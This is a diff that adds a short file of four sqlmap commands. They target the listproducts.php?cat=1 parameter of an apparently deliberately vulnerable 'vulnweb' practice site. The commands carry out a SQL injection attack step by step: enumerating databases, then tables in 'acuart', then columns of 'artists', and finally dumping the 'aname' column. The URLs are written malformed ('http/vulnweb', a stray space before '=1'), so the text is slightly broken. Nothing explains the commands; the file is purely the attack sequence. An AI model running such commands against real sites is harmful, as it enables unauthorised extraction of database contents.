@@ -1,0 +1,9 @@
+sqlmap -u http/vulnweb/listproducts.php?cat =1 --dbs
+sqlmap -u http/vulnweb/listproducts.php?cat =1 -D acuart --tables
+sqlmap -u http/vulnweb/listproducts.php?cat =1 -D acuart -T artists --columns
+sqlmap -u http/vulnweb/listproducts.php?cat =1 -D acuart -T artists -C aname --dump
+
+
+
+
+
